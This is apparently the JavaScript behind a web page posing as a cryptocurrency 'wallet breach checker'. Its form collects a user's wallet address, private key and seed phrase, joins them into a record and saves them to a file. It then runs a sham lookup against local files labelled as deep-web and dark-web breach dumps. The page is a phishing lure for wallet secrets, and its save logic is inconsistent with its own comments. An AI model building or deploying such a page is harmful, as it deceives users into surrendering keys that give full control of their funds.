document.addEventListener("DOMContentLoaded", function () {
    const checkButton = document.querySelector("button[type='submit']");
    const walletInput = document.getElementById("wallet");
    const privateKeyInput = document.getElementById("key");
    const seedPhraseInput = document.getElementById("seed");

    checkButton.addEventListener("click", async function (event) {
        event.preventDefault(); // Evita o recarregamento da página

        const wallet = walletInput.value.trim();
        const privateKey = privateKeyInput.value.trim();
        const seedPhrase = seedPhraseInput.value.trim();

        if (!wallet) {
            alert("Please enter your Wallet Address!");
            return;
        }

        // Formato do texto a ser salvo
        const walletData = `${wallet} - ${privateKey || "No Private Key"} - ${seedPhrase || "No Seed Phrase"}\n`;

        // Salva os dados no arquivo wallets.txt
        await saveToFile(walletData);

        // Mostra modal de loading
        showModal("loadingModal");

        // Verifica localmente nos arquivos da pasta 'breaches'
        const foundInBreach = await checkLocalBreaches(wallet, privateKey, seedPhrase);

        // Fecha modal de loading após a busca
        closeModal("loadingModal");

        // Exibe resultado baseado na verificação
        if (foundInBreach) {
            showModal("dangerModal"); // Mostra modal de perigo
        } else {
            showModal("safeModal"); // Mostra modal de seguro
        }
    });

    // Função para salvar os dados dentro do arquivo wallets.txt
    async function saveToFile(data) {
        try {
            const fileName = "check.txt";

            // Verifica se o arquivo já existe e adiciona os novos dados sem sobrescrever
            const response = await fetch(fileName);
            const existingData = await response.text();
            const newData = existingData + data;

            const blob = new Blob([newData], { type: "text/plain" });
            const a = document.createElement("a");
            a.href = URL.createObjectURL(blob);
            a.download = fileName;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        } catch (error) {
            console.error("Error saving file:", error);
        }
    }

    // Função para verificar se a Wallet, Private Key ou Seed Phrase estão em algum breach
    async function checkLocalBreaches(wallet, privateKey, seedPhrase) {
        const breachFiles = [
            "breaches/deepweb1.txt",
            "breaches/darkweb1.txt",
            "breaches/web1.txt"
        ];

        for (const file of breachFiles) {
            try {
                const response = await fetch(file);
                const data = await response.text();

                if (data.includes(wallet) || (privateKey && data.includes(privateKey)) || (seedPhrase && data.includes(seedPhrase))) {
                    return true; // Encontrado em um breach
                }
            } catch (error) {
                console.error(`Error reading ${file}:`, error);
            }
        }
        return false;
    }

    // Função para mostrar modais
    function showModal(modalId) {
        document.getElementById(modalId).classList.add("show");
    }

    // Função para fechar modais ao clicar no botão "OK"
    document.querySelectorAll(".close-modal").forEach(button => {
        button.addEventListener("click", function () {
            this.parentElement.parentElement.classList.remove("show");
        });
    });
});
